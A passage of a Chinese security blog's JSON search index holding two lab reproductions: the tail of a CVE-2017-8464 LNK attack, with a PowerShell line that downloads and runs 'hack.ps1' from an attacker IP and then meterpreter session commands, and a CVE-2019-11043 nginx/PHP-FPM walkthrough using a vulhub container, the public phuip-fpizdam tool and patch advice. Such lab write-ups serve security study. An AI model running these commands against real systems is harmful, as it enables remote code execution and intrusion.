Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.30.154&#x2F;hack.ps1&#39;);test.ps1&quot; 完成创建，运行快捷方式，一闪而过 回到 kali ，开始攻击 1msf5 exploit(multi&#x2F;handler) &gt; exploit 查看系统信息 1meterpreter &gt; sysinfo 对屏幕进行截图 1meterpreter &gt; screenshot 还可进行更多操作这里就不一一介绍了 登录 shell 1meterpreter &gt; shell 查看当前用户 1C:\\Windows\\System32\\WindowsPowerShell\\v1.0&gt;whoami","path":"2021/02/11/CVE-2017-8464远程命令执行漏洞复现/","date":"02-11","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]},{"title":"CVE-2019-11043漏洞复现","text":"# CVE-2019-11043 漏洞复现 # 0x01 漏洞简介 nginx + php-fpm 配置不当，当 nginx 配置文件中有 fastcgi_split_path_info ，却没有 if(!-f $document_root$fastcgi_script_name)&#123;return 404;&#125; 的时候就会导致远程代码执行。 向 Nginx + PHP-FPM 的服务器 URL 发送 %0a 时，服务器返回异常。 该漏洞需要在 nginx.conf 中进行特定配置才能触发。具体配置如下： 1234567location ~ [^&#x2F;]\\.php(&#x2F;|$) &#123;...fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$;fastcgi_param PATH_INFO $fastcgi_path_info;fastcgi_pass php:9000;...&#125; 攻击者可以使用换行符（％0a）来破坏 fastcgi_split_path_info 指令中的 Regexp。 Regexp 被损坏导致 PATH_INFO 为空，从而触发该漏洞。 影响版本： PHP 7.0 版本 PHP 7.1 版本 PHP 7.2 版本 PHP 7.3 版本 修复建议： PHP 7.1.X 更新至 7.1.33 PHP 7.2.X 更新至 7.2.24 PHP 7.3.X 更新至 7.3.11 # 0x02 环境搭建 系统：kali # 安装 docker、golang 环境 12sudo apt-get install docker docker-composesudo apt install golang # 搭建环境 12git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.gitcd vulhub&#x2F;php&#x2F;CVE-2019-11043 &amp;&amp; docker-compose up -d 查看 docker 环境： 访问 8080 端口，成功如下 # 0x03 漏洞利用 # 安装漏洞利用工具 1234git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.gitcd phuip-fpizdamgo env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cngo get -v &amp;&amp; go build 默认使用的是 proxy.golang.org，在国内无法访问，所以换了一个国内能访问的代理地址：https://goproxy.cn # 工具攻击 1.&#x2F;phuip-fpizdam http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php 成功利用，参数名为 a # 0x04 参考链接： https://blog.csdn.net/weixin_43606134/article/details/107646467 https://blog.csdn.net/qq_43342566/article/details/102733144 http://blog.leanote.com/post/snowming/9da184ef24bd https://blog.csdn.net/weixin_40412037/article/details/111225967","path":"2021/02/10/CVE-2019-11043漏洞复现/","date":"02-10","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]}],"categories":[],"tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"},{"name":"文件上传","slug":"文件上传","permalink":"https://spaceman-911.gitee.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"},{"name":"信息泄露","slug":"信息泄露","permalink":"https://spaceman-911.gitee.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"name":"MSF","slug":"MSF","permalink":"https://spaceman-911.gitee.io/tags/MSF/"}]}